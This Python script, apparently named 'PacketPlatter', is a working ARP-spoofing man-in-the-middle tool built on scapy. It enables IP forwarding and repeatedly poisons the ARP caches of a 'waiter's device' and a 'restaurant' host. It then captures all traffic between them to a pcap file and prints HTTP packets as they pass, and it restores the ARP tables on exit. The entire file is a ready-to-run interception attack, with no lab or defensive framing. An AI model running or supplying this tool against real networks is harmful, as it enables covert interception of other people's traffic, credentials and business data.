import os
import sys
import signal
from scapy.all import ARP, Ether, send, sniff, wrpcap, get_if_hwaddr, TCP, IP
from time import sleep
from threading import Thread

def print_ascii_art():
    art = r"""
    ____             __        __  ____  __      __  __           
   / __ \____ ______/ /_____  / /_/ __ \/ /___ _/ /_/ /____  _____
  / /_/ / __ `/ ___/ //_/ _ \/ __/ /_/ / / __ `/ __/ __/ _ \/ ___/
 / ____/ /_/ / /__/ ,< /  __/ /_/ ____/ / /_/ / /_/ /_/  __/ /    
/_/    \__,_/\___/_/|_|\___/\__/_/   /_/\__,_/\__/\__/\___/_/      
    """
    print(art)

capture_running = True
captured_packets = []


def packet_capture(interface, output_file):
    """Function to capture packets"""
    global captured_packets

    def packet_filter(pkt):
        try:
            captured_packets.append(pkt)
            # Imprimir apenas pacotes HTTP no terminal
            if pkt.haslayer(TCP) and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80):
                print(f"[+] HTTP packet captured: {pkt.summary()}")
        except Exception as e:
            print(f"[!] Error processing packet: {e}")

    print(f"\n[+] Starting packet capture on interface {interface}")
    print(f"[+] Saving packets to {output_file}")

    try:
        sniff(
            iface=interface,
            prn=packet_filter,
            store=0,
            stop_filter=lambda x: not capture_running,
        )

        if captured_packets:
            wrpcap(output_file, captured_packets)
            print(
                f"\n[+] Capture finished. {len(captured_packets)} packets saved to {output_file}"
            )

    except Exception as e:
        print(f"[!] Capture error: {e}")


def restore_arp(dest_ip, dest_mac, source_ip, source_mac, interface):
    """Restore ARP tables"""
    try:
        packet = ARP(
            op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac
        )
        send(packet, iface=interface, verbose=False)
    except Exception as e:
        print(f"[!] Restore error: {e}")


def arp_spoof(target_ip, target_mac, spoof_ip, interface):
    """Perform ARP spoofing"""
    try:
        local_mac = get_if_hwaddr(interface)
        packet = ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=local_mac
        )
        send(packet, iface=interface, verbose=False)
        print("[+] ARP packet sent")
    except Exception as e:
        print(f"[!] Spoof error: {e}")


def enable_ip_forward():
    """Enable IP forwarding"""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding enabled")


def main():
    global capture_running

    def signal_handler(sig, frame):
        global capture_running
        print("\n[!] Detected CTRL+C! Restoring ARP tables...")
        capture_running = False
        restore_arp(target_ip_1, target_mac_1, target_ip_2, target_mac_2, interface)
        restore_arp(target_ip_2, target_mac_2, target_ip_1, target_mac_1, interface)
        wrpcap(output_file, captured_packets)
        print(f"\n[+] Capture finished. Packets saved to {output_file}")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    print_ascii_art()

    interface = input("[?] Enter the interface (e.g., eth0): ").strip()
    target_ip_1 = input("[?] Enter the waiter's device IP: ").strip()
    target_mac_1 = input("[?] Enter the waiter's device MAC: ").strip()
    target_ip_2 = input("[?] Enter the restaurant IP: ").strip()
    target_mac_2 = input("[?] Enter the restaurant MAC: ").strip()
    output_file = input(
        "[?] Enter the output pcap file name (e.g., capture.pcap): "
    ).strip()

    enable_ip_forward()

    capture_thread = Thread(target=packet_capture, args=(interface, output_file))
    capture_thread.daemon = True
    capture_thread.start()

    print("\n[+] Starting ARP Spoofing and packet capture... Press CTRL+C to stop.")

    try:
        while capture_running:
            arp_spoof(target_ip_1, target_mac_1, target_ip_2, interface)
            arp_spoof(target_ip_2, target_mac_2, target_ip_1, interface)
            sleep(1.8)
    except KeyboardInterrupt:
        pass
    finally:
        capture_running = False
        print("\n[!] Stopping ARP Spoofing and restoring ARP tables...")
        restore_arp(target_ip_1, target_mac_1, target_ip_2, target_mac_2, interface)
        restore_arp(target_ip_2, target_mac_2, target_ip_1, target_mac_1, interface)
        capture_thread.join(timeout=2)


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run this script as root!")
        sys.exit(1)
    main()
